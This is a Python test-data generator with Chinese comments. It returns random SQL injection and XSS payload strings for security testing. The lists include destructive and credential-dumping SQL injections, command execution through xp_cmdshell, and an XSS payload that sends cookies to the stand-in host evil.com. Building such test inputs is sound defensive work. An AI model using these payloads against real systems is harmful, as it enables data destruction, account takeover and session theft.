"""安全类生成器（用于安全测试样本）"""
import random


class SecurityGenerator:
    """安全类生成器：SQL注入样式、XSS样本"""

    # SQL 注入样本
    SQL_INJECTION_SAMPLES = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM admin --",
        "admin'--",
        "' OR 1=1 --",
        "1; DELETE FROM users WHERE 1=1; --",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
        "' OR '1'='1' /*",
        "1' AND '1'='1",
        "' OR ''='",
        "1; EXEC xp_cmdshell('dir') --",
        "' UNION SELECT username, password FROM users --",
        "\" OR \"\"=\"",
        "'; EXEC(@@version)--",
        "' OR SLEEP(5) --",
        "1 OR 1=1",
        "' OR 1=1 #",
        "%' OR 1=1 --",
        "admin' AND SUBSTRING(password,1,1)='a'--",
        "'; INSERT INTO users VALUES('hacker','pwned') --",
    ]

    # XSS 样本
    XSS_SAMPLES = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert(1)>",
        "<script>document.cookie</script>",
        "\"><script>alert(1)</script>",
        "'-alert(1)-'",
        "<img src=x:x onerror=alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<form><button formaction=javascript:alert(1)>X</button></form>",
        "<style>@import 'javascript:alert(1)'</style>",
        "javascript:alert(document.domain)",
        "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
        "<img src=\"x\" onerror=\"fetch('http://evil.com/?c='+document.cookie)\">",
    ]

    def generate(self, count=1):
        """生成指定数量的安全类样本"""
        data = []
        for _ in range(count):
            sql_sample = random.choice(self.SQL_INJECTION_SAMPLES)
            xss_sample = random.choice(self.XSS_SAMPLES)
            data.append({
                'SQL注入样本': sql_sample,
                'XSS样本': xss_sample,
            })
        return data

    def get_fields(self):
        """返回字段列表"""
        return ['SQL注入样本', 'XSS样本']
